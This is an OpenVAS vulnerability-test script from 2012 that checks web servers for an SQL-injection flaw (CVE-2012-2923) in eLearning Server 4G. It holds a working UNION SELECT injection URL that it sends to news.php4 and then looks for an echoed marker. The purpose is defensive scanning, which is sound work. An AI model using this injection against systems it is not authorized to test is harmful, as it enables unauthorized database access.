###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_eLearning_server_53472.nasl 12 2013-10-27 11:15:33Z jan $
#
# eLearning Server 4G Remote File Include and SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "eLearning Server 4G is prone to a remote file-include issue and an SQL-
injection issue.

A successful exploit may allow an attacker to execute malicious code
within the context of the webserver process, compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.

eLearning Server 4G is vulnerable; other versions may also be
affected.";


if (description)
{
 script_id(103488);
 script_cve_id("CVE-2012-2923");
 script_bugtraq_id(53472);
 script_version ("$Revision: 12 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("eLearning Server 4G Remote File Include and SQL Injection Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53472");
 script_xref(name : "URL" , value : "http://www.hypermethod.ru/");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-05-14 10:31:27 +0200 (Mon, 14 May 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to inject SQL code");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list(cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/news.php4?nid=-12'+union+select+1,2,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10,11/*"); 

  if(http_vuln_check(port:port, url:url,pattern:"OpenVAS-SQL-Injection-Test")) {
     
    security_hole(port:port);
    exit(0);

  }
}

exit(0);
